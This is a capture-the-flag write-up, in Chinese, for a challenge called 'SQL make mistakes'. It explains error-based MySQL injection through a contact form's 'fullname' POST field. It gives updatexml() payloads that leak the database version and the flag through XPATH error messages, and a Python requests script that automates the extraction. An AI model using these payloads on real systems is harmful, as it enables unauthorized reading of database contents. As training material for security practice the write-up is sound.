# X-071-24 SQL make mistakes
## 题目描述

> Get FLAG from SQLi

## 知识点

- SQL 注入（POST 参数注入）。
- 基于错误（Error-based）的信息回显：MySQL `updatexml()`/`extractvalue()` 触发 XPATH 报错，将查询结果拼进错误信息中。
- 经典注释与语法拼接：`-- -` 注释掉后续语句残余字符，`ORDER BY <expr>` 可执行函数表达式触发报错。

## 解题思路

- 通过黑盒方式检查表单提交通道，关注 `fullname/email/phone/subject/message` 等字段。
- 在 `fullname` 中拼接常见报错注入 Payload，观察返回页面是否出现 SQL 报错（例如 XPATH syntax error）。
- 如果出现报错，则将表达式替换为读取敏感数据（如 `select flag from flag limit 1`），借助报错内容直接回显 flag。
- 工具与方法：可用代理/重复器（如 BurpSuite/Yakit 的 HTTP 工具）直接对 `send.php` 进行 POST，快速验证与迭代 Payload。

核心 Payload 示例：
```
x' ORDER BY updatexml(1,concat(0x7e,(select flag from flag limit 1),0x7e),1) -- -
```
说明：
- 先用 `x'` 关闭原字符串，然后进入 `ORDER BY` 阶段；
- `updatexml(1, concat('~', (子查询), '~'), 1)` 会在执行期抛出 XPATH 错误，错误信息中包含 `~<子查询结果>~`；
- `-- -` 注释掉后续遗留的单引号等字符，避免语法错误。

## 解题步骤
1. 打开站点首页，滚动至 Contact Us 表单。
2. 用代理/重复器抓取提交到 `http://ip32833/send.php` 的请求。
3. 将 `fullname` 参数替换为报错注入 Payload：
   - 先用数据库/版本探测验证回显，例如：
     `x' ORDER BY updatexml(1,concat(0x7e,version(),0x7e),1) -- -`
![image.png](https://x/x12120713627.png)

   - 确认有报错回显后，改为读取 flag：
     `x' ORDER BY updatexml(1,concat(0x7e,(select flag from flag limit 1),0x7e),1) -- -`
4. 发送请求，响应中出现：`XPATH syntax error: '~FLAG{...}~'`，即可提取 `FLAG{...}`。
![image.png](https://x/x12120753223.png)
## EXP
```python
import re
import requests

url = 'http://ip32833/send.php'
data = {
    'fullname': "x' ORDER BY updatexml(1,concat(0x7e,(select flag from flag limit 1),0x7e),1) -- -",
    'email': 'a@a.com',
    'phone': '123',
    'subject': 'test',
    'message': 'hi',
    'submit': ''
}

r = requests.post(url, data=data, timeout=10)
m = re.search(r"XPATH syntax error: '([^']+)'", r.text)
if m:
    print(m.group(1).strip('~'))
```